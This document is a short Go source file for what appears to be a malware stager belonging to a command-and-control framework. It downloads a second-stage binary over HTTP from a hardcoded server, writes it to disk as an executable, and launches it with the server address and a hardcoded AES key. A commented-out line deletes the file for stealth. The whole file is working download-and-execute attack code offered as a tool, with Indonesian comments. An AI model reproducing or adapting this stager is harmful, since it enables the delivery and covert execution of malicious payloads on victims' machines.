package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

var defaultServerURL = "http://127.0.0.1:8080"
var defaultStagePath = "/stage.bin"
var defaultKey = "SpookyOrcaC2AES1"

func main() {
	fmt.Println("[+] Stager started. Downloading stage...")

	// Download stage payload
	stageData, err := downloadStage(defaultServerURL + defaultStagePath)
	if err != nil {
		fmt.Println("[-] Failed to download stage:", err)
		return
	}

	// Tentukan nama file stage yang akan disimpan
	stageFilename := "stage"
	if runtime.GOOS == "windows" {
		stageFilename += ".exe"
	}

	// Tulis stage ke disk
	err = os.WriteFile(stageFilename, stageData, 0755)
	if err != nil {
		fmt.Println("[-] Error writing stage file:", err)
		return
	}
	fmt.Printf("[+] Stage saved to disk: %s\n", stageFilename)

	// Dapatkan path absolut dari file stage
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("[-] Failed to get current executable path:", err)
		return
	}
	// Dapatkan direktori stager (current working directory dari stager)
	dir := filepath.Dir(exePath)
	// Gabungkan direktori dengan nama file stage
	stageFullPath := filepath.Join(dir, stageFilename)

	// Jalankan stage menggunakan path absolut
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command(stageFullPath, defaultServerURL, defaultKey)
	} else {
		cmd = exec.Command(stageFullPath, defaultServerURL, defaultKey)
	}

	err = cmd.Start()
	if err != nil {
		fmt.Println("[-] Failed to run stage:", err)
		return
	}
	fmt.Printf("[+] Stage is launched (PID=%d)\n", cmd.Process.Pid)
	time.Sleep(2 * time.Second)
	// Opsional: Hapus file stage agar stealth
	// os.Remove(stageFullPath)
}

func downloadStage(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Stage download failed, HTTP %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return data, nil
}
